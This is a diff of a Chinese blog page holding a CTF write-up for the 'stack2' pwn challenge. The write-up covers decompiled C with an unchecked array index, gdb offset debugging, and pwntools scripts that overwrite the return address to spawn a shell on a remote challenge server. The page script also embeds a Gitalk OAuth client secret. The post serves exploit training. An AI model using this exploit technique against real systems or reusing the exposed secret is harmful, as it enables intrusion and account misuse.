@@ -6,16 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://l0tus.vip">
-  <title>Tag: Welcome | L0tus&#39; blog</title>
+  <title>谈谈最近学到的简单的东西（八） | L0tus&#39; blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="L0tus&#39; blog">
-<meta property="og:url" content="http://l0tus.vip/tags/Welcome/index.html">
+  <meta name="description" content="攻防世界pwn题stack2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="谈谈最近学到的简单的东西（八）">
+<meta property="og:url" content="http://l0tus.vip/2022/09/28/canary/index.html">
 <meta property="og:site_name" content="L0tus&#39; blog">
+<meta property="og:description" content="攻防世界pwn题stack2">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stack2%20ida-2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stack2%20ida-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stack2%20gdb-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stack2%20gdb-2.png">
+<meta property="article:published_time" content="2022-09-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-09-28T08:43:18.606Z">
 <meta property="article:author" content="L0tus">
-<meta property="article:tag" content="C++">
+<meta property="article:tag" content="pwn笔记">
+<meta property="article:tag" content="write up">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stack2%20ida-2.png">
   
     <link rel="alternative" href="/atom.xml" title="L0tus&#39; blog" type="application/atom+xml">
   
@@ -159,65 +169,228 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-canary" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2077" class="archive-year">2077</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2077/09/16/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2/" class="archive-article-date">
-  	<time datetime="2077-09-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2077-09-16</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2077/09/16/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2/">欢迎来到l0tus的小屋</a>
+    <h1 class="article-title" itemprop="name">
+      谈谈最近学到的简单的东西（八）
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        <!--显示阅读次数-->
+        
+          <br/>
+         <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+         <span class="icon-sort"></span>
+         <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+          	阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+          </span>
+          </a>
+        
+        <!--显示阅读次数完毕-->
+        
+        <a href="/2022/09/28/canary/" class="archive-article-date">
+  	<time datetime="2022-09-27T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-09-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="攻防世界pwn题stack2"><a href="#攻防世界pwn题stack2" class="headerlink" title="攻防世界pwn题stack2"></a>攻防世界pwn题stack2</h1><span id="more"></span>
+<p>下载附件拖进ida之后观察main函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> m; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;***********************************************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*                      An easy calc                       *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*Give me your numbers and I will return to you an average *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*(0 &lt;= x &lt; 256)                                           *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;***********************************************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many numbers you have:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give me your numbers&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="type">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">&quot;average is %.2lf\n&quot;</span>, (<span class="type">double</span>)((<span class="type">long</span> <span class="type">double</span>)v9 / (<span class="type">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Give me your number&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;id\t\tnumber&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\t\t%d\n&quot;</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; j; ++m )</span><br><span class="line">      v9 += v13[m];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并未发现明显的漏洞利用点，没有像之前read这样的明显栈溢出，后来观察发现这里存在一个v13数组的边界溢出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">v13[v5] = v7;</span><br></pre></td></tr></table></figure>
+<p>序号为3的change功能这里并未对v5进行检查，导致我们可以任意输入v5进行栈溢出修改，同时看到有后门函数hackhere</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hackhere</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一眼看成&#x2F;bin&#x2F;sh,仔细一看发现是bash(lol),但是问题不大，我们可以自己传参数<br>既然是要用changenumber功能来修改数组之外的内存，我们就需要计算返回地址和v13的偏移<br>ida中可以看到这个<br><code>char v13[100]; // [esp+38h] [ebp-70h]</code><br>那么ret地址我们就直接当作ebp+4，所以偏移是<em>0x74</em><br>然后我们找出需要的地址：<br><strong>system:0x08048450</strong><br><strong>sh:0x08048987</strong><br>然后注意传参顺序，写出这样的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">addr,num</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;which number to change:&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;new number:&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./canary&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;How many numbers you have:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give me your numbers&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x74</span></span><br><span class="line"></span><br><span class="line">system_addr=<span class="number">0x08048450</span></span><br><span class="line">sh_addr=<span class="number">0x08048987</span></span><br><span class="line"></span><br><span class="line">change(offset,<span class="number">0x50</span>)</span><br><span class="line">change(offset+<span class="number">1</span>,<span class="number">0x84</span>)</span><br><span class="line">change(offset+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(offset+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line">offset=offset+<span class="number">8</span></span><br><span class="line">change(offset,<span class="number">0x87</span>)</span><br><span class="line">change(offset+<span class="number">1</span>,<span class="number">0x89</span>)</span><br><span class="line">change(offset+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(offset+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>但是并打不通</strong>，查阅网上师傅们的wp得知偏移地址有问题，应该是0x84，那这里就试着调试看看<br>先看到这一段汇编：<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stack2%20ida-2.png"><br>根据汇编得知v13的首地址会存放在ax中，那么当程序运行到0x080486D5的时候ax寄存器中存放的就是v13数组的首地址<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stack2%20ida-1.png"><br>而<strong>main endp的上方有retn，可以得知返回地址会存放在sp栈顶中</strong><br>先在0x80486d5(mov [eax], cl)打断点，观察到如下:<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stack2%20gdb-1.png"><br>这里eax记录了v13数组的首地址为<strong>0xffffcf68</strong><br>接着在ret的位置（0x080488F2）打断点，观察如下:<br><img src="https://raw.githubusercontent.com/ChrisL0tus/mess-pictures/main/stack2%20gdb-2.png"><br>这里esp记录了返回地址<strong>0xffffcfec</strong><br>计算得知，偏移<strong>offset &#x3D; 0xffffcfec - 0xffffcf68 &#x3D; 0x84</strong></p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">addr,num</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;which number to change:&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;new number:&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&quot;./canary&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="string">&quot;52412&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;How many numbers you have:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give me your numbers&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x84</span></span><br><span class="line"></span><br><span class="line">system_addr=<span class="number">0x08048450</span></span><br><span class="line">sh_addr=<span class="number">0x08048987</span></span><br><span class="line"></span><br><span class="line">change(offset,<span class="number">0x50</span>)</span><br><span class="line">change(offset+<span class="number">1</span>,<span class="number">0x84</span>)</span><br><span class="line">change(offset+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(offset+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line">offset=offset+<span class="number">8</span></span><br><span class="line">change(offset,<span class="number">0x87</span>)</span><br><span class="line">change(offset+<span class="number">1</span>,<span class="number">0x89</span>)</span><br><span class="line">change(offset+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(offset+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="学到的东西"><a href="#学到的东西" class="headerlink" title="学到的东西"></a>学到的东西</h1><p>1、system里面直接可以传sh，这样也可以获取shell<br>2、一种新的溢出方式，数组边界的溢出<br>3、直接利用题目里的change function绕过canary</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Welcome</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">pwn笔记</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">一些注意事项</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">write up</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://l0tus.vip/2022/09/28/canary/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+
+
+  
+<nav id="article-nav">
+  
+    <a href="/2077/09/12/%E8%A7%84%E5%88%92/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          近期的规划
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2022/09/26/9.26%E6%B1%87%E7%BC%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">9.26汇编语言(第八章)</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
 
+  
+
+  
+
+
+
+  <div id="gitalk-container" style="padding: 0px 30px 0px 30px;"></div> 
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+if(true){
+    var gitalk = new Gitalk({
+    clientID: 'd7ed634dc972bb7fd909',
+    clientSecret: 'fb780f732ab4e8af3a1059bd864c85b1b5235496',
+    repo: 'comments.github.io',
+    owner: 'ChrisL0tus',
+    admin: ['ChrisL0tus'],
+    id: 'Wed Sep 28 2022 00:00:00 GMT+0800',
+    distractionFreeMode: 'true'
+})
+gitalk.render('gitalk-container') 
+}
+</script>
+  
 
           </div>
         </div>
@@ -249,9 +422,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
